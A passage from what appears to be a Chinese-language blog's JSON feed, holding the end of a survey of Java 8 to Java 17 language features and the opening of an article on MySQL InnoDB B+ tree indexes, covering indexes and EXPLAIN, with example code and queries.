1.8，在这之后的版本号不再以 1. 开头，随着发布时间的增加而增加，上图中只有 8、11、17 是 LTS 版本。\n1 2 3 4 % java -version openjdk version \u0026#34;17.0.3\u0026#34; 2022-04-19 LTS OpenJDK Runtime Environment Zulu17.34+19-CA (build 17.0.3+7-LTS) OpenJDK 64-Bit Server VM Zulu17.34+19-CA (build 17.0.3+7-LTS, mixed mode, sharing) Java 版本之间破坏性变更较小，JVM 高度向后兼容，新版通常兼容旧版，例如基于 Java 5 或 Java 8 的程序，一般情况下，不更改代码也可以在 Java 8 到 Java 17 的 JVM 上运行正常；反过来说，不能向前兼容，例如使用 Java 17 编译输出的 Class 或 Jar 文件无法在 17 之前的 JVM 上加载通过：UnsupportedClassVersionError。\n特性概览 下文只列出感兴趣的特性，一般情况下，后一版并不会移除上一版的特性。\nJava 8 要么对数据进行抽象，要么对行为进行抽象。\nLambda expressions 尽管 Java 不是函数式语言，但是 Lambda 表达式允许我们将功能视为方法参数，或将代码视为数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // before java 8 Runnable r1 = new Runnable() { @Override public void run() { System.out.println(\u0026#34;hello world\u0026#34;); // --snip-- } }; // after java 8 Runnable r2 = () -\u0026gt; { System.out.println(\u0026#34;hello world\u0026#34;); // --snip-- }; File dir = new File(\u0026#34;/path/to/dir\u0026#34;); // anonymous class File[] files1 = dir.listFiles(new FileFilter() { @Override public boolean accept(File pathname) { return pathname.getName().endsWith(\u0026#34;.java\u0026#34;); } }); // lambda File[] files2 = dir.listFiles(pathname -\u0026gt; pathname.getName().endsWith(\u0026#34;.java\u0026#34;)); 如果匿名类是“旧酒”，那么 Lambda 表达式是“新瓶”，它更紧凑地表达了“单一抽象方法接口”（被称为 Functional Interface）的实例，Functional Interface 的抽象方法签名决定了函数的参数类型列表和返回值类型。\n1 2 3 4 5 @FunctionalInterface public interface Function\u0026lt;T, R\u0026gt; { R apply(T t); // --snip-- } Java 提供了许多 Functional Interface 充当 lambda 表达式的数据类型，例如：Consumer、Predicate、Supplier。\nfinal or effectively final Lambda 表达式或匿名类在封闭范围访问的外围本地变量必须是 final 或 effectively final 变量。\n1 2 3 4 5 6 7 int n = 0; Arrays.asList(0, 1, 2, 3, 4, 5, 6, 7, 8, 9).forEach(item -\u0026gt; { if (item % 2 == 0) { // This code does not compile! n++; } }); 注意，上面和下面的代码编译都不会通过：Variable used in lambda expression should be final or effectively final.\n1 2 3 4 Supplier\u0026lt;Integer\u0026gt; incrementer(int start) { // This code does not compile! return () -\u0026gt; start++; } 在匿名类方法体内访问外围本地变量时，同样要求我们将它们声明为 final 或者不更改它们的值，后者对于编译器来说最终还是 final。\nAn anonymous class cannot access local variables in its enclosing scope that are not declared as final or effectively final.\nJLS 当中的 §15.27.2 提到了原因：\nThe restriction to effectively final variables prohibits access to dynamically-changing local variables, whose capture would likely introduce concurrency problems.\n简而言之，该限制可以规避一些并发风险，不过访问放置在 Java 堆的实例字段、静态字段并不受此限制。\nMethod references 方法引用为已有名称的方法提供易于阅读的 Lambda 表达式。\n1 2 3 Stream.of(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;).map(item -\u0026gt; item.toUpperCase()).forEach(item -\u0026gt; System.out.println(item)); // can be replaced with a method reference Stream.of(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;).map(String::toUpperCase).forEach(System.out::println); 根据《Effective Java》中的说法，有 5 种类型的用例可供参考。\nStreams 新的 java.util.stream 包提供了 Stream API 来支持对元素流（streams of elements）的函数式操作、链式操作、聚合操作。一个 Stream 是一个元素序列，不同于 Collection，它不是存储元素的数据结构，相反，Stream 通过管道携带来自 Source 的值。一个 Source 可以是一个 Collection、一个数组、一个生成器函数、一个 I/O Channel 等等。\nOracle 的 Java 指南把 Streams 安排到 Collections 之下，通常将两者的 API 结合起来使用，假设有一个名为 roster 且类型是 Collection 的变量，要求打印男性姓名：\n1 2 3 4 5 6 7 8 9 10 11 // before java 8 for (Person p : roster) { if (p.getGender() == Person.Sex.MALE) { System.out.println(p.getName()); } } // after java 8 roster .stream() .filter(e -\u0026gt; e.getGender() == Person.Sex.MALE) .forEach(e -\u0026gt; System.out.println(e.getName())); 一系列聚合操作如同 Unix 的管道隐藏了内部结构，使过程更清晰和简单。\n1 2 3 4 5 6 List\u0026lt;Integer\u0026gt; transactionsIds = transactions.stream() .filter(t -\u0026gt; t.getType() == Transaction.GROCERY) .sorted(comparing(Transaction::getValue).reversed()) .map(Transaction::getId) .collect(toList()); 这么好的例子来自 Processing Data with Java SE 8 Streams, Part 1 和 Part 2: Processing Data with Java SE 8 Streams。\nDefault method 向某一接口新增方法，该接口的所有实现类均要更改，默认方法允许接口提供默认具体实现和兼容旧版本实现类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 interface One { default void method() { System.out.println(\u0026#34;One\u0026#34;); } } interface Two { default void method () { System.out.println(\u0026#34;One\u0026#34;); } } class Three implements One, Two { public void method() { One.super.method(); } } 实现类非必须重写（override）默认方法，假如需要在重写的方法内引用默认方法，应该使用 interface 名称与关键词 super。\nJava 9 Collections 的便利工厂方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 { // before java 9 // mutable List\u0026lt;String\u0026gt; list1 = Arrays.asList(\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;); // since java 9 // immutable List\u0026lt;String\u0026gt; list2 = List.of(\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;); // before java 9 // mutable Set\u0026lt;String\u0026gt; set1 = new HashSet\u0026lt;\u0026gt;(); set1.add(\u0026#34;one\u0026#34;); set1.add(\u0026#34;two\u0026#34;); set1.add(\u0026#34;three\u0026#34;); Set\u0026lt;String\u0026gt; set2 = new HashSet\u0026lt;String\u0026gt;() { { add(\u0026#34;one\u0026#34;); add(\u0026#34;two\u0026#34;); add(\u0026#34;three\u0026#34;); } }; // since java 9 // immutable Set\u0026lt;String\u0026gt; set3 = Set.of(\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;); // before java 9 // mutable Map\u0026lt;String, Integer\u0026gt; map1 = new HashMap\u0026lt;\u0026gt;(); map1.put(\u0026#34;foo\u0026#34;, 1); map1.put(\u0026#34;bar\u0026#34;, 2); Map\u0026lt;String, Integer\u0026gt; map2 = new HashMap\u0026lt;String, Integer\u0026gt;() { { put(\u0026#34;foo\u0026#34;, 1); put(\u0026#34;bar\u0026#34;, 2); } }; // since java 9 // immutable Map\u0026lt;String, Integer\u0026gt; map3 = Map.of(\u0026#34;foo\u0026#34;, 1, \u0026#34;bar\u0026#34;, 2); } Stream 生成器 1 2 3 4 5 6 for (int i = 0; i \u0026lt; 10; ++i) { System.out.println(i); } // since java 9 Stream.iterate(0, i -\u0026gt; i \u0026lt; 10, i -\u0026gt; i + 1) .forEach(System.out::println); Stream takeWhile/dropWhile 1 2 3 4 5 6 7 8 9 10 11 12 // print: 0123443210 Stream.of(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0) .filter(i -\u0026gt; i \u0026lt; 5) .forEach(System.out::print); // print: 01234 Stream.of(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0) .takeWhile(i -\u0026gt; i \u0026lt; 5) .forEach(System.out::print); // print: 56789876543210 Stream.of(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0) .dropWhile(i -\u0026gt; i \u0026lt; 5) .forEach(System.out::print); 遇到第一个不满足条件的元素时，方法 filter 将继续，而方法 takeWhile/dropWhile 将退出。\nJShell JShell 是一种 REPL，即“读-求值-打印”循环，它读取来自用户输入到终端的语句或表达式，进行求值，将结果输出到终端。\nJava 10 本地变量类型推断 1 2 3 4 5 6 { // Pre-Java 10 Person person = new Person(); // With Java 10 var person = new Person(); } 关键词 var 是 variable 的简写，编译器在编译时能够从初始化器（initializer）推断出声明为 var 的本地变量（local variable）的类型，尽管如此，Java 仍然是静态类型语言。\n显式声明类型的本地变量未初始化不可使用，使用 var 修饰的本地变量同理，前者允许迟一点初始化或者干脆不初始化也不使用却能通过编译，后者要求声明后立即提供可推断的初始化器，例如下面的代码编译不通过：\n1 2 3 4 5 6 7 { // Cannot infer type: \u0026#39;var\u0026#39; on variable without initializer var title; title = \u0026#34;barista\u0026#34;; // Cannot infer type: variable initializer is \u0026#39;null\u0026#39; var city = null; } Java 11 Strings 与 Files 的新方法 Strings 方法 isBlank()。没必要只为了 StringUtils.isBlank(java.lang.String) 引入 Apache Commons Lang3。\n方法 lines()。返回从字符串提取的由行组成的流，行之间通过行终止符分隔。\n方法 trim()。方法 trim() 仅删除字符 \u0026lt;= U+0020（空格）；方法 strip() 删除所有 Unicode 空白字符（但不是所有控制字符，例如 \\0）。\nFiles 更容易地从文件读取字符串和写入字符串。\n1 2 3 Path path = Files.writeString(Files.createTempFile(tempDir, \u0026#34;demo\u0026#34;, \u0026#34;.txt\u0026#34;), \u0026#34;Sample text\u0026#34;); String content = Files.readString(path); assertThat(content).isEqualTo(\u0026#34;Sample text\u0026#34;); 运行源文件 可以直接运行源文件，而无需经过手动编译！\n1 2 3 4 5 6 public class MyScript { public static void main(String[] args) { System.out.println(\u0026#34;Hello, \u0026#34; + args[0] + \u0026#34;!\u0026#34;); } } 命令行工具 java 帮你先编译后启动 JVM。\n1 2 % java MyScript.java world Hello, world! Lambda 参数的类型推断 1 (var firstName, var lastName) -\u0026gt; firstName + lastName Java 12 🥵 支持 Unicode 11 和 Switch 表达式的预览。\nJava 13 Switch Expression (Preview) Switch 表达式比 Switch 语句更紧凑、简洁、易于阅读。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 switch (day) { case MONDAY: case FRIDAY: case SUNDAY: System.out.println(6); break; case TUESDAY: System.out.println(7); break; case THURSDAY: case SATURDAY: System.out.println(8); break; case WEDNESDAY: System.out.println(9); break; } // since java 12/13 switch (day) { case MONDAY, FRIDAY, SUNDAY -\u0026gt; System.out.println(6); case TUESDAY -\u0026gt; System.out.println(7); case THURSDAY, SATURDAY -\u0026gt; System.out.println(8); case WEDNESDAY -\u0026gt; System.out.println(9); } Switch 表达式与 Switch 语句一个重要区别在于前者有返回值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 int numLetters; switch (day) { case MONDAY: case FRIDAY: case SUNDAY: numLetters = 6; break; case TUESDAY: numLetters = 7; break; case THURSDAY: case SATURDAY: numLetters = 8; break; case WEDNESDAY: numLetters = 9; break; default: throw new IllegalStateException(\u0026#34;Wat: \u0026#34; + day); } // since java 12/13 int numLetters = switch (day) { case MONDAY, FRIDAY, SUNDAY -\u0026gt; 6; case TUESDAY -\u0026gt; 7; case THURSDAY, SATURDAY -\u0026gt; 8; case WEDNESDAY -\u0026gt; 9; }; Text Blocks (Preview) 在 Java 源文件里写多行的 SQL 令人沮丧，显式的换行和显式的加号是阅读代码的障碍，不经处理复制到其它地方也难以调试：\n1 2 3 String query = \u0026#34;SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB`\\n\u0026#34; + \u0026#34;WHERE `CITY` = \u0026#39;INDIANAPOLIS\u0026#39;\\n\u0026#34; + \u0026#34;ORDER BY `EMP_ID`, `LAST_NAME`;\\n\u0026#34;; 直到终于可以使用“二维”的文本块：\n1 2 3 4 5 String query = \u0026#34;\u0026#34;\u0026#34; SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB` WHERE `CITY` = \u0026#39;INDIANAPOLIS\u0026#39; ORDER BY `EMP_ID`, `LAST_NAME`; \u0026#34;\u0026#34;\u0026#34;; Java 14 Switch Expression Switch 表达式正式加入 Java。\n1 2 3 4 5 6 7 8 9 int j = switch (day) { case MONDAY -\u0026gt; 0; case TUESDAY -\u0026gt; 1; default -\u0026gt; { int k = day.toString().length(); int result = f(k); yield result; } }; 在 Switch 表达式体内显式或隐式使用关键词 yield 产生返回值。\nRecords (Preview) 编写普通的类时常伴随着编写大量的样板代码：构造器、访问器（比如 Getters/Setters）、equals()、toString() 等等，通常有两种方案可以缓解编写样板代码的沮丧：\n生成源代码。例如使用 IDE 生成样板代码。 编译时生成代码。例如使用 Project Lombok。 Records 是一种类型声明，它是 class 的一种受限形式，一条 record 具有名称和状态描述（state description），举例来说：\n1 2 record Point(int x, int y) { } 一条 record 自动获得了许多标准成员：public final 的实例字段、有参构造器、标准的 equals、hashCode、toString 方法，上文的 record Point 近乎等价于：\n1 2 3 4 5 6 7 8 9 10 11 final class Point { public final int x; public final int y; public Point(int x, int y) { this.x = x; this.y = y; } // Implementation of equals, hashCode, toString } Pattern Matching for instanceof (Preview) 使用 instanceof 判断变量之后使用该变量需强制类型转换：\n1 2 3 4 if (obj instanceof String) { String s = (String) obj; // use s } 现在有了更简洁的写法：\n1 2 3 if (obj instanceof String s) { // can use s here } Packaging Tool (Incubator) 命令行工具 jpackage 将 Java 应用程序和 Java 运行时镜像作为输入，并产出包含所有必要依赖的 Java 应用程序镜像。它能够产生特定平台的原生包，例如 Windows 上的 exe 和 msi、MacOS 上的 dmg 和 pkg、Linux 上的 deb 和 rpm，然而每种格式必须在其运行的平台上构建。\nRemove CMS 移除并发标记清除 (CMS) 垃圾收集器。\nJava 15 ZGC 可扩展的低延迟垃圾收集器 ZGC，生产就绪。\nText Blocks Text Blocks 生产就绪。\nSealed Classes (Preview) 一个 sealed class 或者 sealed interface 要求指定允许哪些类继承或者实现。\n1 2 3 4 package com.example.geometry; public abstract sealed class Shape permits Circle, Rectangle, Square { } 如上所示，类 Shape 只能被 Circle、Rectangle、Square 继承，且所有 sealed class 的子类必须是 final、sealed 或非 sealed 的。\nJava 16 Pattern Matching for instanceof Pattern Matching for instanceof 正式加入 Java。\nUnix-Domain Socket Channels Unix-domain sockets 用于同一主机上的进程间的通信，它们大多数方面类似于 TCP/IP Sockets，除了通过操作系统文件路径名而不是通过 IP 地址和端口来寻址。\nJava 17 Pattern Matching for switch (Preview) 虽然 instanceof 已经有更简洁的模式匹配，但是结合过多的 if\u0026hellip;else if\u0026hellip;else 不比 switch 表达式更直观。\n1 2 3 4 5 6 7 8 9 static String formatterPatternSwitch(Object o) { return switch (o) { case Integer i -\u0026gt; String.format(\u0026#34;int %d\u0026#34;, i); case Long l -\u0026gt; String.format(\u0026#34;long %d\u0026#34;, l); case Double d -\u0026gt; String.format(\u0026#34;double %f\u0026#34;, d); case String s -\u0026gt; String.format(\u0026#34;String %s\u0026#34;, s); default -\u0026gt; o.toString(); }; } 现在我们可以把 Object 类型的变量传递给 switch，且已匹配 case 的模式被自动赋值。\nSealed Classes Sealed Classes 正式加入 Java。\nForeign Function \u0026amp; Memory API (Incubator) Foreign Function \u0026amp; Memory API 是 JNI 的替代品，Java 程序可以通过该 API 与 Java 运行时之外的代码和数据进行交互。通过有效调用 Foreign Function（即 JVM 之外的代码）和安全地访问外部内存（即不受 JVM 管理的内存）使 Java 程序能够调用原生库（native libraries）并处理原生数据（process native data），且没有 JNI 的脆弱性和危险性。\n本文首发于 https://h2cone.github.io\n遇到的坑 CGLIB 未支持 Java 17。\n至少有两种解决方案：\n使用 Byte Buddy 代替 cglib，但 API 大相径庭。\n使用 org.springframework.cglib 代替 net.sf.cglib，但依赖 org.springframework:spring-core:5.3.x。\n\u0026hellip;\u0026hellip;\n参考资料 On Java\nJava Versions and Features\nWhy Do Local Variables Used in Lambdas Have to Be Final or Effectively Final?\nJEP 0: JEP Index\nWhat’s New Between Java 11 and Java 17?\nJava version history\n","date":"2022-05-30T10:37:32+08:00","permalink":"https://h2cone.github.io/2022/05/30/java8-java17/","title":"Java 8 到 Java 17 的特性"},{"content":"概述 MySQL 无疑是“八股文”的重灾区之一，默认存储引擎是 InnoDB 的 MySQL 实际上是什么样子？\nMySQL 架构 这是 MySQL 架构图，结合应用程序开发经验，不难看出：\n客户端/服务端模型。\nMySQL 的守护进程是 mysqld。\nMySQL 服务端向客户端提供了 SQL 接口（包括 DDL、DML、DQL、DCL）。\nMySQL 可插拔存储引擎，MySQL 8.0 默认存储引擎是 InnoDB（除非创建表时指定其它引擎）。\nMySQL 服务端从上到下可分为三层次：服务层（SQL、解析、优化、缓存）、存储引擎、文件。\n存储引擎隐藏了数据库文件与内存缓冲池的复杂性，向服务层提供了统一的文件读写接口？\nInnoDB 架构 InnoDB 至少有以下优势：\n遵循 ACID 模型，事务具有提交、回滚、崩溃恢复的功能以保护用户数据。\n行级锁与一致性读提高了多用户并发访问的性能。\n每张 InnoDB 表都有一个聚簇索引，能够最小化主键查询的 I/O 次数。\n支持外键约束来保持数据完整性。\n这是 InnoDB 架构图，二分为在内存中的结构与在磁盘上的结构，\nSQL 执行路径 一条普通的 SELECT 语句的旅程如下所示：\n客户端输入语句。\n消息通过 TCP/IP 线路。\n服务端判定是否命中缓存，未命中则解析语句与生成执行计划。\n服务端调用下层函数。\n存储引擎读写文件。\n索引篇 数据结构 索引是以额外的写入与空间为代价来加速数据查找的一类数据结构的统称。索引就像图书开头名为“目录”的书页或结尾名为“索引”的书页，读者想要查看某一内容，与其从第一页开始翻阅直到遇见目标书页为止，不如先在“索引”或“目录”查找关键词得到页码，有了页码就能快速定位关键词所在的书页。虽然隐喻便于理解索引的加速作用，但说服力有限，至少定性描述解决查找问题的数据结构与算法性能：\n上图是著名的红皮书对所讲述的数据结构与算法时间复杂度的总结，顺序查找最慢，二叉树查找最坏的情况下退化成顺序查询，而有序数组的插入操作很慢，对于查找与插入较好的权衡是 2-3 树查找（红黑树）。散列表或哈希表表现如何？取决于哈希函数的实现，一般情况下，Hash Table 时间复杂度是 O(1)，几乎与 N 无关。\n数据库系统（DBMS）不仅管理内存缓冲池（Buffer Pool），而且管理数据库文件（Database File）。由于计算机系统主存（Memory）与磁盘（Disk）的速度高度不对等，开发者选择数据结构不仅考虑发生在内存的查找与插入，而且高度注意磁盘 I/O 次数或页（Page）访问次数。\n页是一块连续、固定大小的数据。从关系数据库系统的角度来看，某一张表的某一行数据存在于某一页或某一些页中。关系数据库既然声称支持 SQL，那么至少满足以下查询需求：\nFROM \u0026amp; JOIN -\u0026gt; WHERE -\u0026gt; GROUP BY -\u0026gt; HAVING -\u0026gt; SELECT -\u0026gt; ORDER BY -\u0026gt; LIMIT\n在 WHERE 或 HAVING 处，可以是等值条件，如 =，也可以范围条件，如 \u0026lt;、\u0026gt;、BETWEEN \u0026hellip; AND \u0026hellip;；GROUP BY 隐含了是否相等的比较；ORDER BY 要求有序或排序；SELECT 列表可以包含聚合函数，如 COUNT、SUM、MIN、AVG、MAX 等。\n不止于支持等值查询、范围查询、有序操作的高性能的磁盘友好型数据结构是什么？MySQL InnoDB 开发者选择 B+ tree。\nB+ tree 从 B-tree 演化而来，两者都属于平衡查找树，不会出现过长的枝，结点更胖且树更矮有助于缩短搜索路径或减少搜索范围。B+ tree 叶子结点冗余存储键，叶子结点包含的键的范围如下所示：\n[最小键或父母的较小键, 最大键或父母的较大键)\n由于 B+ tree 叶子结点更胖且叶子结点之间相互链接组成有序链表，范围查询时定位到一个叶子结点后无需返回到父母结点，而是遍历有序链表，因此范围查找性能高于 B-tree。\n受到 B+Tree index structures in InnoDB 的启发，确信 InnoDB 基于 B+ tree 实现索引，其结点被称之为页（Page），页包含多条记录（Record），记录由键（Key）与值（Value）组成，值的类型是元组（tuple）或指针（pointer）。除了用户插入的记录，Infimun 和 Supremun 都属于系统记录（system record），前者包含最大下界，后者包含最小上界。叶子页的记录包含行数据，非叶子页的记录包含指向其它页的指针，叶子页之间和非叶子页之间都存在链接，非叶子页为快速定位叶子页提供了导航。\n叶子页逻辑结构：\n非叶子页逻辑结构：\n假设创建一张表并插入一些记录：\n1 2 3 4 5 6 7 CREATE TABLE t_btree ( i INT NOT NULL, s CHAR(10) NOT NULL, PRIMARY KEY(i) ) ENGINE=InnoDB; INSERT INTO t_btree (i, s) VALUES (0, \u0026#34;A\u0026#34;), (1, \u0026#34;B\u0026#34;), (2, \u0026#34;C\u0026#34;); 这张表的索引如下所示（逻辑结构）：\n不局限于二维表格，转移到索引的数据结构是解决问题的全新视角。\n索引分类 按数据结构：\n大多数 MySQL 索引（PRIMARY KEY、UNIQUE、KEY/INDEX）都存储在 B-Trees 中。例外：空间数据类型的索引使用 R-trees；MEMORY 表也支持 Hash 索引；InnoDB 对 FULLTEXT 索引使用倒排列表。\n按存储器：\nAdaptive Hash Index 在内存中，Clustered and Secondary Indexes 和 InnoDB Full-Text Indexes 在磁盘上。\n按索引类（Index Class）：\n按列的个数：\n分成单列索引（column index）和复合索引（composite index），复合索引即多列索引。\n如何使用 创建 用户要么在创建表时创建索引，要么在创建表后创建索引。一般情况下，MySQL 优化器足以通过统计信息从用户创建的索引当中选择最优的索引。\n优化 每张 InnoDB 表都有一个聚簇索引（clustered index），却不一定有二级索引（secondary Index），前者有时被称为主键索引，后者有时被称为辅助索引。聚簇索引叶子页的记录包含整行数据，二级索引叶子页的记录包含主键值。\n假设有一张名为 tab 的表，主键（PRIMARY KEY）是 pk，唯一键（UNIQUE）是 uk，普通索引（KEY/INDEX）的列是 k，无索引的列是 col：\npk uk k col 1 uk1 k1 col1 2 uk2 k2 col2 3 uk3 k3 col3 表 tab 的聚簇索引叶子页们表示为:\n(1, uk1, k1, col1) ⇆ (2, uk2, k2, col2) ⇆ (3, uk3, k3, col13)\n表 tab 的一个二级索引叶子页们表示为：\n(uk1, 1) ⇆ (uk2, 2) ⇆ (uk3, 3)\n表 tab 的另一个二级索引叶子页们表示为：\n(k1, 1) ⇆ (k2, 2) ⇆ (k3, 3)\n下面的语句执行只在一个聚簇索引上搜索：\n1 SELECT * FROM tab WHERE pk = 3; 下面的语句执行依次在一个二级索引和一个聚簇索引上搜索：\n1 SELECT * FROM tab WHERE uk = \u0026#34;uk3\u0026#34;; 先在 uk 的索引找到 (uk3, 3) ，得到主键值为 3，再通过该主键值在 pk 的索引找到 (3, uk3, col13)。由此看来，索引访问次数的差异决定了通过主键查询可以比通过唯一键查询或普通索引列查询更快。应用程序不总是只通过主键查询数据，假设有一张学员表：\n1 2 3 4 5 6 7 8 9 10 11 12 CREATE TABLE `student` ( `id` bigint unsigned NOT NULL AUTO_INCREMENT, `first_name` varchar(50) COLLATE utf8mb4_bin NOT NULL, `last_name` varchar(50) COLLATE utf8mb4_bin NOT NULL, `email` varchar(50) COLLATE utf8mb4_bin NOT NULL, `gender` tinyint unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39;, `ip_address` varchar(20) COLLATE utf8mb4_bin NOT NULL, `level` int NOT NULL DEFAULT \u0026#39;0\u0026#39;, `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP, `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin; 预期数据量足够大的情况下，如何创建索引以提高种一些条件查询的效率：email、level、email and level、level and email？假设 id 的索引名为 pk，若只创建普通索引：email_k，则下面的语句在 email_k 搜索命中后，仍然会在 pk 搜索：\n1 select email, `level` from student where email = \u0026#39;sharryms@edublogs.org\u0026#39;; 若只创建普通索引 level_k，则下面的语句在 level_k 搜索命中后，仍然会在 pk 搜索：\n1 select email, `level` from student where `level` = 59; 除了聚簇索引，是否存在包含 SQL 检索到的所有列的索引？MySQL 支持复合多个普通索引，可以创建多列索引。如果表拥有一个多列索引，优化器可以使用索引的任何最左前缀来查找行。例如，如果在 (col1, col2, col3) 上有一个三列索引，则在 (col1)、(col1, col2) 和 (col1, col2, col3) 上有均有索引。\n使用索引 (col1, col2, col3) 的语句们：\n1 2 SELECT * FROM tbl WHERE col1 = val1; SELECT * FROM tbl WHERE col1 = val1 AND col2 = val2; 无可用索引的语句们：\n1 2 SELECT * FROM tbl WHERE col2 = val2; SELECT * FROM tbl WHERE col2 = val2 AND col3 = val3; MySQL 官方还有一个非常经典的例子，创建一个索引：INDEX name (last_name, first_name)。\n使用索引 name 的语句们：\n1 2 3 4 SELECT * FROM student WHERE last_name = \u0026#39;Jones\u0026#39;; SELECT * FROM student WHERE last_name = \u0026#39;Jones\u0026#39; AND first_name = \u0026#39;John\u0026#39;; SELECT * FROM student WHERE last_name=\u0026#39;Jones\u0026#39; AND (first_name = \u0026#39;John\u0026#39; OR first_name = \u0026#39;Jon\u0026#39;); SELECT * FROM student WHERE last_name = \u0026#39;Jones\u0026#39; AND first_name \u0026gt;=\u0026#39;M\u0026#39; AND first_name \u0026lt; \u0026#39;N\u0026#39;; 无法使用索引 name 的语句们：\n1 2 SELECT * FROM student WHERE first_name = \u0026#39;John\u0026#39;; SELECT * FROM student WHERE last_name = \u0026#39;Jones\u0026#39; OR first_name = \u0026#39;John\u0026#39;; 覆盖了查询语句中所有列的索引被称为覆盖索引（covering index），在中文语境，覆盖索引可以避免回表，回表指的是在一个索引上搜索完成后返回到另一个索引上搜索。如果在索引 (col1, col2, col3) 命中了 col1，那么可直接获取 col1、col2、col3 而无需继续在其它索引上搜索 col2 或 col3。\n如果用 (email)、(level) 依次表示 email_k、level_k，那么 (email, level) 表示多个索引：(email)、(email, level)，反过来说，(level, email) 表示多个索引：(level)、(level, email)。对于优化器来说，level and email 和 email and level 等价，剩下 level 和 email 需要覆盖。\n一般情况下，页包含的记录越短或者列长度之和越短，又或者索引占用空间越小，从磁盘加载到内存也就越快。数据类型 VARCHAR(M) 其中的 M 表示以字符为单位声明的非二进制字符串类型的列长度，例如，上文列 email 的数据类型是 varchar(50)，它表示可存储的最大字符数为 50，然而，一个字符等于多少字节则取决于字符集。列长度单位是字节数，如何计算可以参考数据类型存储要求。\n既然过长字符串有可能降低查询性能，那有哪些优化方案？MySQL 支持索引字符串前缀，但是，前缀的区分度过低的话，很有可能增加扫描行数（rows examined），在最坏的情况下（最后一个键的值才全等），不仅在二级索引上遍历许多值的前缀相等的键，而且每次都要返回到聚簇索引上进一步查找和对比才能确认是否全等；由于回表，字符串前缀索引很少成为覆盖索引。如果后缀比前缀区分度更高，可以考虑倒序排列字符串，例如先倒排存储身份证号，将来查询需要反转输入字符串：\n1 select column_list from t where id_card = REVERSE(\u0026#39;input_id_card\u0026#39;); 如果用 count(distinct col) 表示 col 的基数，那么 col 的区分度计算类似于：\n1 select count(distinct col) / count(*) from t; 另一种方案是新增相应的哈希列，例如增加整数类型的列：身份证号的 CRC32，查询需要调用哈希函数，且需要组合原列处理可能发生碰撞的场景：\n1 select column_list from t where id_card_crc = CRC32(\u0026#39;input_id_card\u0026#39;) and id_card = \u0026#39;input_id_card\u0026#39;; 简单总结一下四种索引字符串方式的优缺点：\n索引字符串 优点 缺点 整串 扫描行数或回表次数较少。 空间占用较大。 前缀 空间占用较小。 可能增加扫描行数或回表次数。 倒序 无需新增列。 不支持范围查询；空间占用较大。 哈希 扫描行数或回表次数较少。 不支持范围查询；需要新增列。 有时，业务系统要求数据不重复，唯一索引实现了数据库层的唯一性约束。与普通索引相比，Change Buffer 无法缓冲对唯一索引的插入，除非设置 unique_checks = 0，因为唯一性检查要求必须将页从磁盘读入内存才能判断某值是否已存在。\nINSERT、UPDATE 和 DELETE 都需要更改所有索引，出于这个原因，这些变更通常会被缓冲。页在缓冲池中被更改，而不立即刷入磁盘。删除记录时，会设置一个标志，因此不会立即在磁盘上删除记录。稍后，变更将由 InnoDB 后台线程刷入磁盘。已在内存中更改但尚未刷入磁盘的页被称为脏页，数据变更缓冲区被称为 Change Buffer。\n普通索引组合 Change Buffer 是一种不错的优化：\n一张页可以在内存中多次更改，并且只能刷入磁盘一次。\n因为脏页们一起刷入磁盘，所以 I/O 次数比较少。\n做正确的事情 优化具体查询语句的第一步不应直接套用上文所说的方式，而应该先使用 EXPLAIN，特别是理解 EXPLAIN 输出信息，比如是否使用索引、使用哪些索引、访问类型、预计扫描行数等。\n当表 student 只有聚簇索引：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 mysql\u0026gt; show index from student; +---------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment | Visible | Expression | +---------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | student | 0 | PRIMARY | 1 | id | A | 204700 | NULL | NULL | | BTREE | | | YES | NULL | +---------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ 1 row in set (0.01 sec) mysql\u0026gt; explain select * from student where id = 169951; +----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+ | 1 | SIMPLE | student | NULL | const | PRIMARY | PRIMARY | 8 | const | 1 | 100.00 | NULL | +----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select email, `level` from student where email = \u0026#39;sharryms@edublogs.org\u0026#39;; 